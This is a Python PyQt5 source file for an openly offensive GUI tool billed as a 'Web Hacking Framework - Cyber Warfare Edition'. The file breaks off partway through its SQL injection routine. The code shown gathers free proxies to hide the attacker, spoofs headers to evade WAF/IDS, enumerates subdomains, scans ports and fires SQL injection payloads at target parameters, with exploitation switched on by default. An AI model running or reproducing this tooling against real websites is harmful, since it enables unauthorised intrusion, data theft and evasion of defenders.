import sys
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import threading
import time
import json
import re
import random
import concurrent.futures
from datetime import datetime
import socket
import ssl

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit, QHBoxLayout,
    QProgressBar, QGroupBox, QStatusBar, QComboBox, QListWidget, QListWidgetItem,
    QCheckBox, QSpinBox, QFileDialog
)
from PyQt5.QtGui import QPalette, QColor, QIcon, QFont
from PyQt5.QtCore import (
    QThread, pyqtSignal, Qt, QTimer, QCoreApplication, QObject
)

class ProxyManager(QObject):
    proxy_found_signal = pyqtSignal(str)
    proxy_status_signal = pyqtSignal(str)
    proxy_fetch_complete_signal = pyqtSignal(list)

    def __init__(self, parent_log_signal):
        super().__init__()
        self.log_signal = parent_log_signal
        self.validated_proxies = []
        self.stop_fetching = threading.Event()
        self.current_fetch_thread = None

    def _log(self, message):
        self.log_signal.emit(f"[PROXY_MGR] {message}")

    def fetch_and_test_proxies_async(self):
        if self.current_fetch_thread and self.current_fetch_thread.is_alive():
            self._log("Proxy fetching already in progress.")
            return

        self.stop_fetching.clear()
        self.validated_proxies = []
        self.proxy_status_signal.emit("Fetching and testing proxies...")
        
        self.current_fetch_thread = threading.Thread(target=self._fetch_and_test_proxies)
        self.current_fetch_thread.daemon = True
        self.current_fetch_thread.start()

    def stop_fetching_proxies(self):
        if self.current_fetch_thread and self.current_fetch_thread.is_alive():
            self.stop_fetching.set()
            self._log("Proxy fetching interrupted. Waiting for tasks to finish...")
        else:
            self._log("No active proxy fetching thread to stop.")
        self.proxy_status_signal.emit("Proxy fetching stopped.")

    def _fetch_and_test_proxies(self):
        self._log(f"[{datetime.now().strftime('%H:%M:%S')}] Starting proxy fetch and validation...")
        proxy_sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxyscan.io/api/proxy?type=http,https&limit=50"
        ]
        raw_proxies = set()

        for source in proxy_sources:
            if self.stop_fetching.is_set(): break
            self._log(f"  Fetching from: {source}")
            try:
                if "free-proxy-list.net" in source:
                    response = requests.get(source, timeout=10, verify=False)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    table = soup.find("table", class_="table-striped")
                    if table:
                        for row in table.find_all("tr")[1:]:
                            cols = row.find_all("td")
                            if len(cols) > 1:
                                ip = cols[0].text.strip()
                                port = cols[1].text.strip()
                                if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip) and port.isdigit():
                                    raw_proxies.add(f"http://{ip}:{port}")
                elif "api/proxy" in source or "proxyscrape.com" in source:
                    response = requests.get(source, timeout=10, verify=False)
                    if response.headers.get('Content-Type') and 'json' in response.headers['Content-Type']:
                        proxy_data = response.json()
                        for proxy in proxy_data:
                            ip = proxy.get('Ip') or proxy.get('ip')
                            port = proxy.get('Port') or proxy.get('port')
                            if ip and port:
                                raw_proxies.add(f"http://{ip}:{port}")
                                if 'https' in proxy.get('Type', []) or proxy.get('ssl') == 'yes':
                                    raw_proxies.add(f"https://{ip}:{port}")
                    else:
                        for line in response.text.splitlines():
                            line = line.strip()
                            if line and re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+", line):
                                raw_proxies.add(f"http://{line}")
                                raw_proxies.add(f"https://{line}")

            except requests.exceptions.RequestException as e:
                self._log(f"  Error fetching from {source}: {e}")
            except json.JSONDecodeError as e:
                self._log(f"  JSON decoding error for {source}: {e}")
            except Exception as e:
                self._log(f"  Unexpected error for {source}: {e}")
        
        self._log(f"  Collected {len(raw_proxies)} raw proxies. Starting validation...")
        
        test_url = "http://httpbin.org/ip"
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            valid_raw_proxies = [p for p in raw_proxies if re.match(r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+", p)]
            future_to_proxy = {executor.submit(self._test_proxy, proxy_str, test_url): proxy_str for proxy_str in valid_raw_proxies}
            
            for future in concurrent.futures.as_completed(future_to_proxy):
                if self.stop_fetching.is_set():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                proxy_str = future_to_proxy[future]
                try:
                    is_valid = future.result()
                    if is_valid:
                        self.validated_proxies.append(proxy_str)
                        self.proxy_found_signal.emit(proxy_str)
                except Exception as e:
                    pass

        self._log(f"[{datetime.now().strftime('%H:%M:%S')}] Proxy validation completed. Found {len(self.validated_proxies)} live proxies.")
        self.proxy_status_signal.emit(f"Proxy fetch complete. Found {len(self.validated_proxies)} live proxies.")
        self.proxy_fetch_complete_signal.emit(self.validated_proxies)

    def _test_proxy(self, proxy_str, test_url):
        if self.stop_fetching.is_set(): return False
        try:
            proxies = {
                "http": proxy_str,
                "https": proxy_str,
            }
            response = requests.get(test_url, proxies=proxies, timeout=5, verify=False)
            if response.status_code == 200:
                if re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", response.text):
                    return True
            return False
        except requests.exceptions.RequestException:
            return False
        except Exception:
            return False


class WebHackingTool(QMainWindow):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    status_signal = pyqtSignal(str)
    scan_complete_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle("RACOGPT Web Hacking Framework - Cyber Warfare Edition")
        self.setGeometry(100, 100, 1600, 1000)

        self.apply_dark_theme()

        self.proxy_manager = ProxyManager(self.log_signal)
        
        self.init_ui()

        self.proxy_manager.proxy_found_signal.connect(self.add_proxy_to_list)
        self.proxy_manager.proxy_status_signal.connect(self.status_signal.emit)
        self.proxy_manager.proxy_fetch_complete_signal.connect(self.populate_proxy_combo)

        self.log_signal.connect(self.update_log)
        self.progress_signal.connect(self.update_progress_bar)
        self.status_signal.connect(self.statusBar.showMessage)
        self.scan_complete_signal.connect(self.on_scan_complete)

        self.scanning_active = False
        self.target_links = set()
        self.vulnerabilities_found = []

    def apply_dark_theme(self):
        app = QApplication.instance()
        if not app:
            print("Warning: QApplication not initialized before apply_dark_theme. Creating one now.")
            app = QApplication(sys.argv)

        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(20, 20, 20))
        palette.setColor(QPalette.WindowText, QColor(220, 220, 220))
        palette.setColor(QPalette.Base, QColor(10, 10, 10))
        palette.setColor(QPalette.AlternateBase, QColor(30, 30, 30))
        palette.setColor(QPalette.ToolTipBase, QColor(255, 255, 220))
        palette.setColor(QPalette.ToolTipText, QColor(0, 0, 0))
        palette.setColor(QPalette.Text, QColor(220, 220, 220))
        palette.setColor(QPalette.Button, QColor(40, 40, 40))
        palette.setColor(QPalette.ButtonText, QColor(220, 220, 220))
        palette.setColor(QPalette.BrightText, QColor(255, 0, 0))
        palette.setColor(QPalette.Link, QColor(60, 170, 255))
        palette.setColor(QPalette.Highlight, QColor(0, 140, 255))
        palette.setColor(QPalette.HighlightedText, QColor(255, 255, 255))
        app.setPalette(palette)

        font = QFont("Consolas", 10)
        app.setFont(font)

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)

        left_panel = QVBoxLayout()
        left_panel.setSpacing(10)

        target_group = QGroupBox("Target & Global Settings")
        target_layout = QVBoxLayout(target_group)
        self.url_label = QLabel("Target URL:")
        self.url_input = QLineEdit("http://testphp.vulnweb.com")
        self.url_input.setPlaceholderText("Enter target URL (e.g., http://example.com)")
        target_layout.addWidget(self.url_label)
        target_layout.addWidget(self.url_input)

        self.target_scope_label = QLabel("Scan Scope (e.g., example.com):")
        self.target_scope_input = QLineEdit("testphp.vulnweb.com")
        self.target_scope_input.setPlaceholderText("Enter root domain for in-scope scanning")
        target_layout.addWidget(self.target_scope_label)
        target_layout.addWidget(self.target_scope_input)

        self.timeout_label = QLabel("Request Timeout (seconds):")
        self.timeout_spinbox = QSpinBox()
        self.timeout_spinbox.setRange(5, 60)
        self.timeout_spinbox.setValue(15)
        target_layout.addWidget(self.timeout_label)
        target_layout.addWidget(self.timeout_spinbox)

        self.auto_scan_checkbox = QCheckBox("Auto-Scan on Startup (Initiate immediately)")
        self.auto_scan_checkbox.setChecked(False)
        target_layout.addWidget(self.auto_scan_checkbox)

        button_layout = QHBoxLayout()
        self.start_scan_button = QPushButton("Initiate Cyber Attack")
        self.start_scan_button.clicked.connect(self.start_scan)
        self.stop_scan_button = QPushButton("Cease Operations")
        self.stop_scan_button.clicked.connect(self.stop_scan)
        self.stop_scan_button.setEnabled(False)
        button_layout.addWidget(self.start_scan_button)
        button_layout.addWidget(self.stop_scan_button)
        target_layout.addLayout(button_layout)
        left_panel.addWidget(target_group)

        proxy_group = QGroupBox("Proxy Management (Evasion & Anonymity)")
        proxy_layout = QVBoxLayout(proxy_group)
        
        self.proxy_mode_label = QLabel("Selected Proxy:")
        self.proxy_combo = QComboBox()
        self.proxy_combo.addItem("No Proxy (Direct Connection)")
        proxy_layout.addWidget(self.proxy_mode_label)
        proxy_layout.addWidget(self.proxy_combo)

        self.fetch_proxies_button = QPushButton("Fetch & Test Live Proxies")
        self.fetch_proxies_button.clicked.connect(self.proxy_manager.fetch_and_test_proxies_async)
        self.stop_proxy_fetch_button = QPushButton("Stop Proxy Fetch")
        self.stop_proxy_fetch_button.clicked.connect(self.proxy_manager.stop_fetching_proxies)
        
        proxy_fetch_buttons_layout = QHBoxLayout()
        proxy_fetch_buttons_layout.addWidget(self.fetch_proxies_button)
        proxy_fetch_buttons_layout.addWidget(self.stop_proxy_fetch_button)
        proxy_layout.addLayout(proxy_fetch_buttons_layout)

        self.live_proxies_list = QListWidget()
        self.live_proxies_list.setStyleSheet("background-color: #1a1a1a; color: #add8e6; font-family: 'Consolas', 'Monospace'; font-size: 9pt;")
        self.live_proxies_list.setSelectionMode(QListWidget.SingleSelection)
        self.live_proxies_list.itemClicked.connect(self.select_proxy_from_list)
        proxy_layout.addWidget(self.live_proxies_list)

        left_panel.addWidget(proxy_group)

        options_group = QGroupBox("Attack Vectors & Parameters")
        options_layout = QVBoxLayout(options_group)

        self.vuln_type_label = QLabel("Primary Attack Vector:")
        self.vuln_type_combo = QComboBox()
        self.vuln_type_combo.addItems([
            "All (Full Spectrum Recon & Attack)",
            "Reconnaissance (Subdomains, Ports, Fingerprinting)",
            "SQL Injection (Database Annihilation)",
            "Cross-Site Scripting (XSS - Client-Side Dominance)",
            "Remote Code Execution (RCE - Server Takeover)",
            "File Inclusion (LFI/RFI - System File Access)",
            "Directory Traversal (Path Manipulation)",
            "Insecure Direct Object Reference (IDOR - Unauthorized Data Access)",
            "Broken Authentication/Session Management (Login Bypass)",
            "API Endpoint Fuzzing (Web Services Exploitation)",
            "SSRF (Internal Network Penetration)",
            "XXE (XML External Entity - Data Exfiltration)",
            "Sensitive File Disclosure (Configuration Exposure)",
            "Admin Panel Discovery (Hidden Entry Points)",
            "CORS Misconfiguration (Cross-Origin Data Theft)"
        ])
        options_layout.addWidget(self.vuln_type_label)
        options_layout.addWidget(self.vuln_type_combo)

        self.recursive_scan_checkbox = QCheckBox("Recursive Scan (Deep Dive / Link & Form Discovery)")
        self.recursive_scan_checkbox.setChecked(True)
        options_layout.addWidget(self.recursive_scan_checkbox)

        self.scan_depth_label = QLabel("Scan Depth (Links to follow):")
        self.scan_depth_spinbox = QSpinBox()
        self.scan_depth_spinbox.setRange(0, 3)
        self.scan_depth_spinbox.setValue(1)
        options_layout.addWidget(self.scan_depth_label)
        options_layout.addWidget(self.scan_depth_spinbox)

        self.exploit_checkbox = QCheckBox("Attempt Exploitation (Execute Payloads)")
        self.exploit_checkbox.setChecked(True)
        options_layout.addWidget(self.exploit_checkbox)

        self.content_modify_checkbox = QCheckBox("Attempt Web Content Modification on Success")
        self.content_modify_checkbox.setChecked(False)
        options_layout.addWidget(self.content_modify_checkbox)

        self.bypass_waf_checkbox = QCheckBox("Bypass WAF/IDS (Advanced Evasion Techniques)")
        self.bypass_waf_checkbox.setChecked(False)
        options_layout.addWidget(self.bypass_waf_checkbox)

        self.payload_label = QLabel("Custom Payload (Optional - Hex/Base64 Encoded for Evasion):")
        self.payload_input = QLineEdit()
        self.payload_input.setPlaceholderText("Enter custom payload (e.g., 'SELECT @@version')")
        options_layout.addWidget(self.payload_label)
        options_layout.addWidget(self.payload_input)

        options_group.setLayout(options_layout)
        left_panel.addWidget(options_group)

        left_panel.addStretch(1)

        right_panel = QVBoxLayout()
        right_panel.setSpacing(10)

        log_group = QGroupBox("Operation Log (Real-time Threat Intelligence)")
        log_layout = QVBoxLayout(log_group)
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color: #1a1a1a; color: #00ff00; font-family: 'Consolas', 'Monospace'; font-size: 10pt;")
        log_layout.addWidget(self.log_output)

        log_buttons_layout = QHBoxLayout()
        self.clear_log_button = QPushButton("Clear Log")
        self.clear_log_button.clicked.connect(self.log_output.clear)
        self.export_results_button = QPushButton("Export Results")
        self.export_results_button.clicked.connect(self.export_results)
        log_buttons_layout.addWidget(self.clear_log_button)
        log_buttons_layout.addWidget(self.export_results_button)
        log_layout.addLayout(log_buttons_layout)
        right_panel.addWidget(log_group)

        vuln_group = QGroupBox("Vulnerabilities Detected & Exploited")
        vuln_layout = QVBoxLayout(vuln_group)
        self.vuln_list = QListWidget()
        self.vuln_list.setStyleSheet("background-color: #1a1a1a; color: #ff00ff; font-family: 'Consolas', 'Monospace'; font-size: 10pt;")
        vuln_layout.addWidget(self.vuln_list)
        right_panel.addWidget(vuln_group)

        self.progress_bar = QProgressBar(self)
        self.progress_bar.setValue(0)
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setStyleSheet("QProgressBar { text-align: center; color: black; }"
                                        "QProgressBar::chunk { background-color: #00ff00; width: 20px; }")
        right_panel.addWidget(self.progress_bar)

        main_layout.addLayout(left_panel, 1)
        main_layout.addLayout(right_panel, 3)

        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.statusBar.setStyleSheet("QStatusBar { background-color: #2a2a2a; color: #00ffff; }")
        self.statusBar.showMessage("RACOGPT Online. Awaiting Orders.")

    def add_proxy_to_list(self, proxy_str):
        self.live_proxies_list.addItem(proxy_str)

    def populate_proxy_combo(self, validated_proxies):
        self.proxy_combo.clear()
        self.proxy_combo.addItem("No Proxy (Direct Connection)")
        if validated_proxies:
            self.proxy_combo.addItems(validated_proxies)
            self.proxy_combo.setCurrentIndex(1)
            self.status_signal.emit(f"Ready: {len(validated_proxies)} live proxies loaded.")
        else:
            self.status_signal.emit("No live proxies found. Operating direct.")
    
    def select_proxy_from_list(self, item):
        index = self.proxy_combo.findText(item.text())
        if index != -1:
            self.proxy_combo.setCurrentIndex(index)

    def get_selected_proxy(self):
        selected_text = self.proxy_combo.currentText()
        if selected_text == "No Proxy (Direct Connection)":
            return None
        return selected_text

    def start_scan(self):
        target_url = self.url_input.text().strip()
        target_scope = self.target_scope_input.text().strip()
        if not target_url or not target_scope:
            QMessageBox.warning(self, "Input Error", "Please enter a target URL and define the scan scope.")
            return

        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url

        self.log_output.clear()
        self.vuln_list.clear()
        self.vulnerabilities_found = []
        self.progress_bar.setValue(0)
        self.start_scan_button.setEnabled(False)
        self.stop_scan_button.setEnabled(True)
        self.scanning_active = True
        self.target_links = {target_url}

        selected_proxy = self.get_selected_proxy()
        proxy_info = f" (Proxy: {selected_proxy})" if selected_proxy else " (No Proxy)"

        self.log_signal.emit(f"[+] [{datetime.now().strftime('%H:%M:%S')}] Commencing full-spectrum cyber attack on: {target_url} (Scope: {target_scope}){proxy_info}\n")
        self.status_signal.emit("Scanning in progress...")

        self.scan_thread = threading.Thread(target=self._perform_scan, args=(target_url, target_scope, selected_proxy))
        self.scan_thread.daemon = True
        self.scan_thread.start()

    def stop_scan(self):
        if self.scanning_active:
            self.scanning_active = False
            self.log_signal.emit(f"[!] [{datetime.now().strftime('%H:%M:%S')}] Scan interrupted by user command. Disengaging.\n")
            self.status_signal.emit("Scan stopped.")
            self.start_scan_button.setEnabled(True)
            self.stop_scan_button.setEnabled(False)
            self.progress_bar.setValue(0)

    def _get_request_headers(self):
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
                'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
                'curl/7.64.1',
                'python-requests/2.27.1'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        }

        if self.bypass_waf_checkbox.isChecked():
            self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [!] WAF/IDS evasion techniques active: X-Forwarded-For, X-Override-URL, random capitalization.\n")
            headers['X-Forwarded-For'] = f'127.0.0.1, {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'
            headers['Referer'] = f'http://{random.choice(["google.com", "bing.com", "yahoo.com"])}/'
            headers['X-Originating-IP'] = '127.0.0.1'
            headers['X-Remote-IP'] = '127.0.0.1'
            headers['X-Remote-Addr'] = '127.0.0.1'
            headers['True-Client-IP'] = '127.0.0.1'
            headers['X-Rewrite-URL'] = '/' + ''.join(random.sample('abcdefghijklmnopqrstuvwxyz', 5)) + '/'

        return headers

    def _get_proxies_for_request(self, selected_proxy):
        if selected_proxy:
            return {
                "http": selected_proxy,
                "https": selected_proxy,
            }
        return None

    def _fetch_url(self, url, method='GET', data=None, headers=None, allow_redirects=True, selected_proxy=None):
        if not self.scanning_active: return None
        try:
            req_headers = self._get_request_headers()
            if headers: req_headers.update(headers)

            proxies = self._get_proxies_for_request(selected_proxy)
            timeout = self.timeout_spinbox.value()

            if method == 'GET':
                response = requests.get(url, headers=req_headers, timeout=timeout, verify=False, proxies=proxies, allow_redirects=allow_redirects)
            elif method == 'POST':
                response = requests.post(url, headers=req_headers, data=data, timeout=timeout, verify=False, proxies=proxies, allow_redirects=allow_redirects)
            elif method == 'HEAD':
                response = requests.head(url, headers=req_headers, timeout=timeout, verify=False, proxies=proxies, allow_redirects=allow_redirects)
            
            self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] Fetched {url} - Status: {response.status_code}\n")
            return response
        except requests.exceptions.RequestException as e:
            self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [ERROR] Request failed for {url} (Proxy: {selected_proxy if selected_proxy else 'None'}): {e}\n")
            return None

    def _perform_scan(self, initial_target_url, target_scope, selected_proxy):
        visited_urls = set()
        urls_to_scan_queue = [(initial_target_url, 0)]
        scan_depth_limit = self.scan_depth_spinbox.value()

        self._recon_phase(initial_target_url, target_scope, selected_proxy)

        total_simulated_checks = 1000
        performed_checks = 0

        while urls_to_scan_queue and self.scanning_active:
            current_url, current_depth = urls_to_scan_queue.pop(0)

            if current_url in visited_urls:
                continue

            self.log_signal.emit(f"\n[+] [{datetime.now().strftime('%H:%M:%S')}] Processing URL (Depth {current_depth}): {current_url}\n")
            visited_urls.add(current_url)
            self.target_links.add(current_url)

            response = self._fetch_url(current_url, selected_proxy=selected_proxy)
            if response is None:
                continue

            server_header = response.headers.get('Server', 'N/A')
            x_powered_by = response.headers.get('X-Powered-By', 'N/A')
            self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] Fingerprint: Server={server_header}, X-Powered-By={x_powered_by}\n")

            if self.recursive_scan_checkbox.isChecked() and current_depth < scan_depth_limit:
                self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] Discovering new targets...\n")
                soup = BeautifulSoup(response.text, 'html.parser')
                links_found = set()
                for tag in soup.find_all(['a', 'form'], href=True):
                    link = urljoin(current_url, tag['href'])
                    parsed_link_domain = urlparse(link).netloc
                    if (parsed_link_domain == target_scope or parsed_link_domain.endswith(f".{target_scope}")) and link not in visited_urls and link not in self.target_links:
                        links_found.add((link, current_depth + 1))
                        self.target_links.add(link)
                        self.log_signal.emit(f"        Discovered: {link}\n")

                for form in soup.find_all('form'):
                    action = form.get('action')
                    if action:
                        form_url = urljoin(current_url, action)
                        parsed_form_domain = urlparse(form_url).netloc
                        if (parsed_form_domain == target_scope or parsed_form_domain.endswith(f".{target_scope}")) and form_url not in visited_urls and form_url not in self.target_links:
                            links_found.add((form_url, current_depth + 1))
                            self.target_links.add(form_url)
                            self.log_signal.emit(f"        Discovered Form Target: {form_url}\n")
                
                urls_to_scan_queue.extend(list(links_found))
                self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] Total unique targets for scanning: {len(self.target_links)}\n")

            self._scan_for_sqli(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_xss(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_lfi(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_rce(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_idor(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_api_fuzzing(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_ssrf(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_xxe(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break
            
            self._scan_for_sensitive_files(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_admin_panels(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_cors_misconfig(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            self._scan_for_broken_auth(current_url, response, selected_proxy)
            performed_checks += 50; self.progress_signal.emit(min(99, int((performed_checks / total_simulated_checks) * 100)))
            if not self.scanning_active: break

            time.sleep(0.05)

        if self.scanning_active:
            self.log_signal.emit(f"\n[+] [{datetime.now().strftime('%H:%M:%S')}] Scan completed across all discovered targets. Review threat intelligence report.\n")
            self.statusBar.showMessage("Scan complete. Targets analyzed.")
            self.scan_complete_signal.emit("finished")
        else:
            self.statusBar.showMessage("Scan stopped by user command.")
        self.start_scan_button.setEnabled(True)
        self.stop_scan_button.setEnabled(False)
        self.progress_bar.setValue(100)

    def _recon_phase(self, url, scope, selected_proxy):
        self.log_signal.emit(f"\n[+] [{datetime.now().strftime('%H:%M:%S')}] Initiating Reconnaissance Phase for {scope}...\n")
        
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] Performing Subdomain Enumeration (Passive/DNS lookup simulation)..\n")
        common_subdomains = ["www", "admin", "dev", "test", "api", "blog", "mail", "ftp", "cpanel", "webmail", "store", "shop"]
        discovered_subdomains = set()
        
        base_domain = urlparse(url).netloc
        if base_domain.startswith("www."):
            base_domain = base_domain[4:]

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            future_to_sub = {executor.submit(self._check_subdomain_exists, f"{sub}.{base_domain}", selected_proxy): sub for sub in common_subdomains}
            for future in concurrent.futures.as_completed(future_to_sub):
                subdomain = future_to_sub[future]
                try:
                    ip_address = future.result()
                    if ip_address and self.scanning_active:
                        self.log_signal.emit(f"        [+] Discovered Subdomain: {subdomain}.{base_domain} ({ip_address})\n")
                        discovered_subdomains.add(f"http://{subdomain}.{base_domain}")
                        discovered_subdomains.add(f"https://{subdomain}.{base_domain}")
                except Exception as exc:
                    self.log_signal.emit(f"        Error checking {subdomain}.{base_domain}: {exc}\n")
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] Subdomain enumeration completed. Found {len(discovered_subdomains)} potential subdomains.\n")
        for sub_url in discovered_subdomains:
            if (urlparse(sub_url).netloc == scope or urlparse(sub_url).netloc.endswith(f".{scope}")) and sub_url not in self.target_links:
                self.target_links.add(sub_url)

        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] Performing Port Scan on {urlparse(url).hostname} (Common Ports: 80, 443, 21, 22, 23, 8080)...\n")
        target_host = urlparse(url).hostname
        common_ports = [21, 22, 23, 80, 110, 139, 443, 445, 3306, 8080, 8443, 135, 137, 138, 143, 993, 995, 1433, 1521, 5432, 5900, 5985, 5986, 8000, 9000]
        open_ports = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_port = {executor.submit(self._check_port_open, target_host, port): port for port in common_ports}
            for future in concurrent.futures.as_completed(future_to_port):
                port = future_to_port[future]
                try:
                    if future.result() and self.scanning_active:
                        open_ports.append(port)
                        self.log_signal.emit(f"        [+] Port {port} is OPEN on {target_host}\n")
                except Exception as exc:
                    pass
        
        if open_ports:
            self.add_vulnerability_item("Open Ports", target_host, "Informational", f"Open ports discovered: {', '.join(map(str, sorted(open_ports)))}")
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] Port scanning completed.\n")
        
        time.sleep(1)

    def _check_subdomain_exists(self, subdomain_url, selected_proxy):
        if not self.scanning_active: return None
        proxies = self._get_proxies_for_request(selected_proxy)
        try:
            response = requests.head(f"http://{subdomain_url}", timeout=5, verify=False, proxies=proxies)
            if response.status_code < 500:
                ip_address = socket.gethostbyname(urlparse(subdomain_url).hostname)
                return ip_address
        except requests.exceptions.RequestException:
            pass
        except socket.gaierror:
            pass
        return None

    def _check_port_open(self, host, port):
        if not self.scanning_active: return False
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        try:
            result = sock.connect_ex((host, port))
            if result == 0:
                return True
        except socket.error:
            pass
        finally:
            sock.close()
        return False

    def _scan_for_sqli(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Conducting SQL Injection vector analysis...\n")
        sqli_payloads = [
            "' OR 1=1--", "' OR '1'='1", '" OR 1=1--', "admin'--",
            "sleep(5)--", "1' UNION SELECT NULL,NULL,NULL--",
            "1 and 1=convert(int,(select @@version))--",
            "1 AND (SELECT SLEEP(5))",
            "ORDER BY 1000--",
            "CAST(rand(1)*10000000000000000 AS INT)"
        ]
        if self.payload_input.text():
            sqli_payloads.insert(0, self.payload_input.text())

        found_sqli = False
        parsed_url = urlparse(url)
        
        query_params = parsed_url.query.split('&')
        if query_params != ['']:
            for param_pair in query_params:
                if not self.scanning_active: break
                param_name = param_pair.split('=')[0]
                original_value = param_pair.split('=', 1)[1] if '=' in param_pair else ''

                for payload in sqli_payloads:
                    if not self.scanning_active: break
                    test_value = f"{original_value}{payload}"
                    new_query = '&'.join([f"{param_name}={test_value}" if p.startswith(param_name + '=') else p for p in query_params])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing SQLi on GET '{param_name}' with '{payload[:20]}...' at {test_url}\n")
                    test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)

                    if test_response:
                        if re.search(r"SQL syntax|mysql_fetch_array|You have an error in your SQL syntax|ORA-\d{5}|SQLSTATE\[|Unclosed quotation mark", test_response.text, re.IGNORECASE):
                            self.log_signal.emit(f"        [!!!] Detected Error-Based SQLi on parameter '{param_name}' at: {test_url}\n")
                            self.add_vulnerability_item("SQL Injection", test_url, "Critical", f"Error-Based: Payload '{payload}'")
                            found_sqli = True
                            if self.exploit_checkbox.isChecked():
                                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching SQLi exploitation sequence...\n")
                                self.simulate_exploit("SQL Injection", test_url, payload=payload, selected_proxy=selected_proxy)
                            return
                        elif "sleep" in payload and test_response.elapsed.total_seconds() > 4:
                            self.log_signal.emit(f"        [!!!] Detected Time-Based SQLi on parameter '{param_name}' at: {test_url}\n")
                            self.add_vulnerability_item("SQL Injection", test_url, "High", f"Time-Based: Payload '{payload}'")
                            found_sqli = True
                            if self.exploit_checkbox.isChecked():
